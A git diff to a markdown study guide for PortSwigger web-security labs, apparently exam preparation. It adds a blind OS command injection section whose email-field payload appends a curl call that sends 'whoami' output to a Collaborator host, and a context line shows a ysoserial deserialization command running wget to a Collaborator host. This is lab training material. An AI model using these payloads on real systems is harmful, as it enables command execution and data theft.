@@ -27,6 +27,7 @@
 [File path traversal](#file-path-traversal)  
 [File Uploads](#file-uploads)  
 [Deserialization](#deserialization)  
+[OS Command Injection](#os-command-injection)  
   
 **[Appendix](#appendix)**  
 [Solve Labs with Python](#solve-labs-with-python)  
@@ -2390,8 +2391,15 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
 
 ### Feedback  
 
->OAuth
+>The target application **feedback** function require email parameter, and ***identifying*** for blind OS command injection by appending ```||curl COLLABORATOR.net||``` bash curl command and observing if request made to Collaborator.  
+  
+```bash
+email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
+```
 
+![os command injection](images/os-command-inject.png)  
+
+[PortSwigger Lab: Blind OS command injection with out-of-band data exfiltration
  
 # Appendix  
 
